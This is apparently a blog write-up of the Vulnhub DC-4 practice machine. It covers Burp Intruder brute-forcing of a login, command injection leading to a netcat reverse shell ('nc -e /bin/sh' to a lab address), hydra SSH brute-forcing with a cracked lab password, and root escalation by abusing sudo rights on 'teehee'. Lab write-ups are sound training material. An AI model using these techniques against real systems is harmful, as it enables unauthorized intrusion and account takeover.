---
"title": "Vulnhub - DC 4"
"date": 2019-11-18
"tags": ["easy", "hydra", "intruder"]
"keywords": ["easy", "hydra", "intruder"]
"categories": ["Vulnhub"]
"author": "Ghostbyt3"
"description": "We are going to pwn DC 4 by DCAU7 from Vulnhub"
"featured_image": "/img/dc4/1.1.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "Vulnhub - Writeup"
---


![Untitled](/img/dc4/1.1.png)
We are going to pwn DC 4 by DCAU7 from Vulnhub


## Description
>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.
Unlike the previous DC releases, this one is designed primarily for  beginners/intermediates. There is only one flag, but technically,  multiple entry points and just like last time, no clues.
Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
For beginners, Google can be of great assistance, but you can always  tweet me at @DCAU7 for assistance to get you going again. But take note:  I won't give you the answer, instead, I'll give you an idea about how  to move forward.


Download Link: [https://www.vulnhub.com/entry/dc-4,313/](https://www.vulnhub.com/entry/dc-4,313/)

Lets Begin with our Initial Scan

## Nmap Scan Results

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Looks like only HTTP port is open so lets start our Gobuster

## Gobuster Result

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.8
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/11/26 19:35:19 Starting gobuster
===============================================================
/css (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
===============================================================
2019/11/26 19:35:20 Finished
===============================================================
```

![Untitled](/img/dc4/1.png)

It looks like login Page 
So i tried some normal sql injection but none worked so lets try bruteforce
We can use Burp Intruder for that

![Untitled](/img/dc4/2.png)

Attack type : Cluster Bomb

![Untitled](/img/dc4/3.png)

Now in payload , load wordlist and start attack!

![Untitled](/img/dc4/4.png)

This one gives different length it might be the password [br/](br/)
![Untitled](/img/dc4/5.png)

And yes I logged in.
After login I got a page Command.php[br/](br/)
![Untitled](/img/dc4/6.png)[br/](br/)
![Untitled](/img/dc4/7.png)

## Getting Shell

It looks like , it executes system commands.
So I intercept the command with burp and got a reverse shell.
![Untitled](/img/dc4/8.png)

> nc -e /bin/sh 10.0.2.18 1234 


![Untitled](/img/dc4/9.png)

We got a Shell!!

![Untitled](/img/dc4/10.png)

So while searching for anything usefull i found ``old-passwords.bak``

Since i found it in jim directory, lets bruteforce with ``jim``

## Getting User Jim

Lets start bruteforcing the ssh port using hydra

> hydra - a very fast network logon cracker which supports many different services

![Untitled](/img/dc4/11.png)

we found the password is ``jim:jibril04``

Found some users too

![Untitled](/img/dc4/12.png)

## Getting User Charles

While Checking jim directory there is ``mbox``

![Untitled](/img/dc4/13.png)

Since it looks like mail we check ``/var/mail``

![Untitled](/img/dc4/14.png)

It gives password for ``charles`` I su to charles

## Privilege Escalation

``sudo -l`` shows we can run ``teehee`` with root permission

![Untitled](/img/dc4/15.png)

It looks like we can overwrite any file so i created new user with root permission without password!

Got ROOT !!

``Flag``

![Untitled](/img/dc4/16.png)






